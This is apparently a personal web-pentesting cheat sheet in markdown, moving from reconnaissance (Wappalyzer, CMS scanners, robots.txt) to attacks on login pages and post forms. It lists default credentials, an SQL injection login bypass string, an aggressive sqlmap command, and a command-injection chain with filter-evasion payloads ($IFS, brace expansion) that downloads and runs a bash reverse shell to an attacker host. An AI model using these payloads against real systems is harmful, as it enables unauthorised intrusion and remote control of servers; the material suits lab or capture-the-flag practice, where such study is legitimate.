# First Steps
## Wappalyzer 
Shows which techologies were used to create the website
- Security
- Cloud
- CMS
- Language

### CMS Systems
#### WordPress (Open-Source)
Websites around blogging 
#### Magento (Open-Source)
Websites around shopping

## Check URL's
Click around the website and see how the folders are organized
> [!NOTE] 
> Check what the home folder is (Ex. index.php). \
> Index.php/folders are common in MVC frameworks like Codeigniter and Laravel
## Copyright 
The copyright at the bottom of the page typically indicates when the website was last updated. If you see an old copyright, the website will typically have old software.
> [!NOTE] 
> The website can be configured to pull the current date for the copyright
## Check for a CMS scanner 
Look for a scanner for the CMS that the website was created with.
- **WordPress**: wpscan
- **Magento**: magescan
```bash
php magescan.phar scan:all http://IP/
```

## Common Files
- **index.php**: tells you if it is a php website
- **robots.txt**: guide for search engine bots (telling them where not to go)
- **index.html**: default home page

# Next Steps
## Login Page 
### Try Default Creds 
admin:admin
> [!NOTE] 
> Look up default credentials based on the service
### SQL Injection
admin:' or 1=1;--
### SQLMap
1. Capture a login request with Burp and save it as log.req
2. Run SQL injection testing
```bash
sqlmap -r login.req --batch --dbs --level=3 --risk=3
```
> [!NOTE] 
> Cross Site Request Forgery (CSRF) Tokens are unique for each session/request and are validated server-side. This makes it hard for sqlmap to work properly.


> [!Caution]
> Running a high risk factor could negatively impact the server
### Forgot Password
See if you can validate email addresses.
### Sign Up 
Try to sign up for a new account

## Posts
### Cross-Site Scripting 
Attempt to Bold Text
```form
<b>TITLE/USERNAME</b>
```
### Check if there is a User-Agent 
Set up Listener on Attacking Machine
```bash
sudo nc -lvnp 80
```
In Post
```form
http://<ATTACKING_IP>/
```
Take note User-Agent (ex. Curl)
#### Curl
Ex. Request:
```bash
os.popen(curl $Content)
```
1. Check if you can download a file

(On Attacking Machine)
  ```bash
  echo "Test" > test
  ```
(Website: Post)
  ```form
  http://<ATTACKING_IP>/test -o /var/www/html/test
  ```
(Website)
Go to http://IP/test to see if the test file is there

2. Check if you can execute code

Proof of Concept:
  ```form
  http://<ATTACKING_IP>/$(whoami)
  ```
Burp Suite Repeater (Capture Request)

  Test
  ```form
  http://<ATTACKING_IP>/$(echo test)
  ```

  URL Encoding
  ```form
  http://<ATTACKING_IP>/$(echo+test)
  ```

  Bracket Expansion
  ```form
  http://<ATTACKING_IP>/$({echo,test})
  ```

  IFS Variable
  ```form
  http://<ATTACKING_IP>/$(echo$IFS'test')
  ```

3. Execute a Reverse shell
Reverse Shell
```File
bash -c 'bash -i &> /dev/tcp/<ATTACKING_IP>/<PORT> 0>&1'
```
Start Web Server 
```bash
sudo python3 -m http.server 80
```
Download Reverse Shell
```form
http://<ATTACKING_IP>/$(curl$IFS' -o'$IFS'/var/www/html/test'$IFS'http://ATTACKING_IP>/test')
```
Execute Reverse Shell
```form
http://<ATTACKING_IP>/$(bash$IFS'/var/www/html/test')
```
## Searchsploit
Search for CMS exploits with similar version numbers 
> [!NOTE]
> Compare creation_date/vendor_contact to copyright (creation after copyright)



